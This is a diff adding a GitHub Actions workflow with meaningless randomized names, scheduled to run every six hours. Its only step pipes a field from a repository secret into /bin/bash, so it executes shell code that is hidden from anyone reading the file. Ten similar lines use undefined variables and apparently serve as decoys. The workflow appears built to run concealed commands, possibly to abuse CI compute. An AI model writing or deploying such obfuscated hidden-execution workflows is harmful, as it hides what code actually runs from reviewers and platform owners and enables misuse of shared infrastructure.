@@ -1,0 +1,28 @@
+name: wutianqy
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wutianqy
+        env:
+          aqt08: ${{ secrets.aqt08 }}
+        run: |
+          echo $aqt08 | jq -r .ehyf65199 | /bin/bash
+          echo $jrebx7406 | jq -r .y38 | /bin/bash
+          echo $n3270 | jq -r .lyr9059 | /bin/bash
+          echo $lr8456 | jq -r .ag0908 | /bin/bash
+          echo $cfr7092 | jq -r .cfu03 | /bin/bash
+          echo $t2724 | jq -r .j04926 | /bin/bash
+          echo $l87972 | jq -r .njy2 | /bin/bash
+          echo $nxi0 | jq -r .s41163 | /bin/bash
+          echo $liuql75 | jq -r .hob8 | /bin/bash
+          echo $paf581 | jq -r .z1 | /bin/bash
+          echo $zr239 | jq -r .oge72871 | /bin/bash
+
